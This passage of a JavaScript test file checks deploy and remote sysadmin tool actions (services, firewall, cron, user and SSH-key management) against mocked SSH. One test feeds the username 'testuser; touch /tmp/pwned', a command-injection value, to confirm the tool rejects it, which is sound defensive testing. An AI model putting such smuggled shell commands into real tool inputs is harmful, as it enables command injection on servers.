      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "deploy",
        {
          server: "production",
          remote_path: "/var/www/app",
          method: "git",
        },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });

    it("deploy with named config", async () => {
      mockResolveDeployConfig.mockReturnValue({
        server: "production",
        remote_path: "/var/www/app",
        method: "git",
      });
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({ stdout: "OK", stderr: "", exitCode: 0 });
      const result = await executeTool("deploy", { config: "production" });
      expect(result).toContain("Deployed");
    });
  });

  // ─── deployment_status with mocked SSH ────────────────────────
  describe("deployment_status with mocked SSH", () => {
    it("checks deployment status", async () => {
      mockLoadDeployConfigs.mockReturnValue({
        production: { server: "prod", remote_path: "/var/www/app" },
      });
      mockResolveProfile.mockReturnValue({
        host: "prod.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({ stdout: "OK", stderr: "", exitCode: 0 });
      const result = await executeTool("deployment_status", {});
      expect(result).toContain("Deployment Status");
      expect(result).toContain("production");
    });

    it("handles unreachable server", async () => {
      mockLoadDeployConfigs.mockReturnValue({
        staging: { server: "staging", remote_path: "/var/www/app" },
      });
      mockResolveProfile.mockReturnValue({
        host: "staging.example.com",
        user: "deploy",
      });
      mockSshExec.mockResolvedValue({
        stdout: "",
        stderr: "Connection refused",
        exitCode: 1,
      });
      const result = await executeTool("deployment_status", {});
      expect(result).toContain("Deployment Status");
    });

    it("handles config not found", async () => {
      mockLoadDeployConfigs.mockReturnValue({
        production: { server: "prod", remote_path: "/app" },
      });
      const result = await executeTool("deployment_status", {
        config: "nonexistent",
      });
      expect(result).toContain("NOT FOUND");
    });
  });

  // ─── sysadmin with mocked SSH (remote execution) ──────────────
  describe("sysadmin remote execution", () => {
    it("runs audit on remote server", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "=== OS / KERNEL ===\nAlmaLinux 9",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "audit",
        server: "server1",
      });
      expect(result).toContain("AlmaLinux");
    });

    it("runs disk_usage on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "/dev/sda1  100G  50G  50G  50%",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "disk_usage",
        server: "server1",
        path: "/",
      });
      expect(result).toContain("/dev/sda1");
    });

    it("runs process_list on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "USER PID %CPU %MEM\nroot 1 0.1 0.5",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "process_list",
        server: "server1",
      });
      expect(result).toContain("root");
    });

    it("runs network_status on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "LISTEN  0.0.0.0:80  nginx",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "network_status",
        server: "server1",
      });
      expect(result).toContain("nginx");
    });

    it("runs user_manage list on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "deploy uid=1000 gid=1000 shell=/bin/bash",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "list",
        server: "server1",
      });
      expect(result).toContain("deploy");
    });

    it("runs cron list on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "0 3 * * * /usr/bin/backup.sh",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "list",
        server: "server1",
      });
      expect(result).toContain("backup");
    });

    it("runs ssl_check on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Days until expiry: 45",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "ssl_check",
        domain: "example.com",
        server: "server1",
      });
      expect(result).toContain("45");
    });

    it("runs log_tail on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Mar 19 10:00:00 error: something",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "log_tail",
        path: "/var/log/syslog",
        server: "server1",
      });
      expect(result).toContain("error");
    });

    it("runs find_large on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "500M\t/var/log/big.log",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "find_large",
        server: "server1",
      });
      expect(result).toContain("500M");
    });

    it("runs firewall status on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "running\npublic (active)",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "status",
        server: "server1",
      });
      expect(result).toContain("running");
    });

    it("runs service status on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "nginx.service - active (running)",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "status",
        service_name: "nginx",
        server: "server1",
      });
      expect(result).toContain("active");
    });

    it("runs service list_failed on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "redis.service  loaded  failed",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "list_failed",
        server: "server1",
      });
      expect(result).toContain("redis");
    });

    it("runs kill_process by pid on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Sent SIGTERM to PID 12345",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "kill_process",
        pid: 12345,
        server: "server1",
      });
      expect(result).toContain("SIGTERM");
    });

    it("runs kill_process by name on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Sent SIGTERM to all 'zombie' processes",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "kill_process",
        process_name: "zombie",
        server: "server1",
      });
      expect(result).toContain("zombie");
    });

    it("runs journalctl on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Mar 19 10:00:00 systemd[1]: Started",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "journalctl",
        unit: "nginx",
        server: "server1",
      });
      expect(result).toContain("Started");
    });

    it("runs package list on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec
        .mockResolvedValueOnce({
          stdout: "/usr/bin/dnf\ndnf",
          stderr: "",
          exitCode: 0,
        })
        .mockResolvedValueOnce({
          stdout: "nginx.x86_64  1.24.0  @appstream",
          stderr: "",
          exitCode: 0,
        });
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "list",
        server: "server1",
      });
      expect(result).toContain("nginx");
    });

    it("runs service start on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "nginx started",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "start",
        service_name: "nginx",
        server: "server1",
      });
      expect(typeof result).toBe("string");
    });

    it("runs service stop on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "nginx.service stopped",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "stop",
        service_name: "nginx",
        server: "server1",
      });
      expect(result).toContain("nginx");
    });

    it("runs service restart on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "nginx active (running)",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "restart",
        service_name: "nginx",
        server: "server1",
      });
      expect(result).toContain("nginx");
    });

    it("runs service reload on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({ stdout: "", stderr: "", exitCode: 0 });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "reload",
        service_name: "nginx",
        server: "server1",
      });
      expect(result).toContain("service reload OK");
    });

    it("runs service enable on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "nginx.service enabled",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "enable",
        service_name: "nginx",
        server: "server1",
      });
      expect(result).toContain("nginx");
    });

    it("runs service disable on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "nginx.service disabled",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "disable",
        service_name: "nginx",
        server: "server1",
      });
      expect(result).toContain("nginx");
    });

    it("runs firewall allow on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "success",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "allow",
        port: "80/tcp",
        server: "server1",
      });
      expect(typeof result).toBe("string");
    });

    it("runs firewall deny on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "success",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "deny",
        port: "8080/tcp",
        server: "server1",
      });
      expect(typeof result).toBe("string");
    });

    it("runs firewall remove on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "success",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "remove",
        port: "80/tcp",
        server: "server1",
      });
      expect(typeof result).toBe("string");
    });

    it("runs firewall reload on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "success",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "reload",
        server: "server1",
      });
      expect(typeof result).toBe("string");
    });

    it("runs cron add on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Cron entry added",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "add",
        schedule: "0 3 * * *",
        command: "/usr/bin/backup.sh",
        server: "server1",
      });
      expect(result).toContain("Cron entry added");
    });

    it("runs cron remove on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "Matching cron entries removed",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "remove",
        command: "backup",
        server: "server1",
      });
      expect(result).toContain("removed");
    });

    it("runs user_manage create on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "User testuser created",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "create",
        user: "testuser",
        server: "server1",
      });
      expect(result).toContain("testuser");
    });

    it("runs user_manage delete on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "User testuser deleted",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "delete",
        user: "testuser",
        server: "server1",
      });
      expect(result).toContain("testuser");
    });

    it("runs user_manage add_ssh_key on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "SSH key added for testuser",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "add_ssh_key",
        user: "testuser",
        ssh_key: "ssh-rsa AAAA...",
        server: "server1",
      });
      expect(result).toContain("SSH key added");
    });

    it("rejects unsafe usernames before remote execution", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "create",
        user: "testuser; touch /tmp/pwned",
        server: "server1",
      });
      expect(result).toContain("unsafe characters");
      expect(mockSshExec).not.toHaveBeenCalled();
    });

    it("runs user_manage info on remote", async () => {
      mockResolveProfile.mockReturnValue({
        host: "server1.example.com",
        user: "root",
      });
      mockSshExec.mockResolvedValue({
        stdout: "uid=1000(deploy) gid=1000(deploy)",
        stderr: "",
        exitCode: 0,
      });
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "info",
        user: "deploy",
        server: "server1",
      });
      expect(result).toContain("deploy");
    });
  });
});
